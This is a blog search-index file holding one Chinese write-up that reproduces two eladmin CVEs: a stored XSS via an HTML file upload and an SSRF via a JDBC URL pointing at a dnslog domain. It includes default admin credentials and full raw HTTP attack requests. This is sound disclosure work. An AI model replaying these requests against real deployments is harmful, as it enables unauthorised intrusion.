<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>eladmin-复现</title>
      <link href="/jcxj/2024/09/09/eladmin-fu-xian/"/>
      <url>/jcxj/2024/09/09/eladmin-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0-github项目地址"><a href="#0-github项目地址" class="headerlink" title="0.github项目地址"></a>0.github项目地址</h1><p><a href="https://github.com/elunez/eladmin">elunez/eladmin: eladmin jpa 版本：项目基于 Spring Boot 2.6.4、 Jpa、 Spring Security、Redis、Vue的前后端分离的后台管理系统，项目采用分模块开发方式， 权限控制采用 RBAC，支持数据字典与数据权限管理，支持一键生成前后端代码，支持动态路由 (github.com)</a></p><h1 id="1-用默认密码登录后台"><a href="#1-用默认密码登录后台" class="headerlink" title="1.用默认密码登录后台"></a>1.用默认密码登录后台</h1><p>admin/123456</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909093504969.png" class="" title="image-20240909093504969"><h1 id="CVE-2024-44676"><a href="#CVE-2024-44676" class="headerlink" title="CVE-2024-44676"></a>CVE-2024-44676</h1><p>XSS漏洞</p><h2 id="1-找到文件存储功能"><a href="#1-找到文件存储功能" class="headerlink" title="1.找到文件存储功能"></a>1.找到文件存储功能</h2><p>系统工具 - 存储股那里 - 文件上传</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094917731.png" class="" title="image-20240909094917731"><p>上传文件，数据包如下</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;localStorage?name&#x3D;111 HTTP&#x2F;1.1Host: localhost:8000Content-Length: 204sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarydm6xWQjws9AqeeBjsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Accept: *&#x2F;*Origin: http:&#x2F;&#x2F;localhost:8013Sec-Fetch-Site: same-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8013&#x2F;Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close------WebKitFormBoundarydm6xWQjws9AqeeBjContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.html&quot;Content-Type: text&#x2F;html&lt;script&gt;alert(1)&lt;&#x2F;script&gt;------WebKitFormBoundarydm6xWQjws9AqeeBj--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-访问文件地址"><a href="#2-访问文件地址" class="headerlink" title="2.访问文件地址"></a>2.访问文件地址</h2><p>如下图，出现弹窗，证明了存在xss漏洞</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094818168.png" class="" title="image-20240909094818168"><h1 id="CVE-2024-44677"><a href="#CVE-2024-44677" class="headerlink" title="CVE-2024-44677"></a>CVE-2024-44677</h1><p>SSRF漏洞</p><h2 id="1-访问dnslog平台并申请域名"><a href="#1-访问dnslog平台并申请域名" class="headerlink" title="1.访问dnslog平台并申请域名"></a>1.访问dnslog平台并申请域名</h2><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909093611696.png" class="" title="image-20240909093611696"><p>域名为 ae2a2f2773.ipv6.1433.eu.org.</p><h2 id="2-在数据库管理中测试ssrf"><a href="#2-在数据库管理中测试ssrf" class="headerlink" title="2.在数据库管理中测试ssrf"></a>2.在数据库管理中测试ssrf</h2><p>testssrf.ae2a2f2773.ipv6.1433.eu.org.</p><p>漏洞点在 运维管理 - 数据库管理 - 新增数据库 - jdbc地址</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094023940.png" class="" title="image-20240909094023940"><p>数据包为</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;database HTTP&#x2F;1.1Host: localhost:8013Content-Length: 111sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Content-Type: application&#x2F;jsonsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http:&#x2F;&#x2F;localhost:8013Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8013&#x2F;mnt&#x2F;mnt&#x2F;databaseAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: USER_NAME_COOKIE&#x3D;admin; SID_1&#x3D;6ff9d0e1; ELADMIN-TOEKN&#x3D;Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQConnection: close&#123;&quot;id&quot;:null,&quot;name&quot;:&quot;11&quot;,&quot;jdbcUrl&quot;:&quot;jdbc:mysql:&#x2F;&#x2F;testssrf.ae2a2f2773.ipv6.1433.eu.org.&quot;,&quot;userName&quot;:&quot;1&quot;,&quot;pwd&quot;:&quot;1&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点击确定后能看到右上角提示新增成功</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094257824.png" class="" title="image-20240909094257824"><p>点击 jdbc 地址右侧的测试</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094440434.png" class="" title="image-20240909094440434"><p>数据包为</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;database&#x2F;testConnect HTTP&#x2F;1.1Host: localhost:8013Content-Length: 253sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Content-Type: application&#x2F;jsonsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http:&#x2F;&#x2F;localhost:8013Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8013&#x2F;mnt&#x2F;mnt&#x2F;databaseAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: USER_NAME_COOKIE&#x3D;admin; SID_1&#x3D;6ff9d0e1; ELADMIN-TOEKN&#x3D;Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQConnection: close&#123;&quot;id&quot;:&quot;3e070f45c072498299675b4f290137bd&quot;,&quot;name&quot;:&quot;11&quot;,&quot;jdbcUrl&quot;:&quot;jdbc:mysql:&#x2F;&#x2F;testssrf.ae2a2f2773.ipv6.1433.eu.org.&quot;,&quot;userName&quot;:&quot;aaa&quot;,&quot;pwd&quot;:&quot;111&quot;,&quot;createBy&quot;:&quot;admin&quot;,&quot;createTime&quot;:&quot;2024-09-09 09:42:42&quot;,&quot;updateBy&quot;:&quot;admin&quot;,&quot;updateTime&quot;:&quot;2024-09-09 09:44:21&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到dndlog平台，如下图所示，有dns请求解析记录，证明了ssrf漏洞</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094520768.png" class="" title="image-20240909094520768">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
